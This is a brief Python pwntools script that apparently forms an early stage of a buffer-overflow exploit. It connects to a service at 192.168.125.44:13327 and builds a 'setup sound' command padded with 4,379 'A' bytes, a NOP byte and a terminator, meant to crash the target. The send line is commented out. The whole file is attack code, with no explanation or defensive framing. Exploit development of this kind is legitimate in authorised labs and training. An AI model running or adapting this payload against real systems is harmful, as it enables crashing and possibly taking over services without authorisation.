from pwn import *

r = remote('192.168.125.44', 13327)

crash = b"A" * 4379

payload = b"\x11(setup sound " + crash + b"\x90\x00#"

r.recvline()
## r.send(payload)
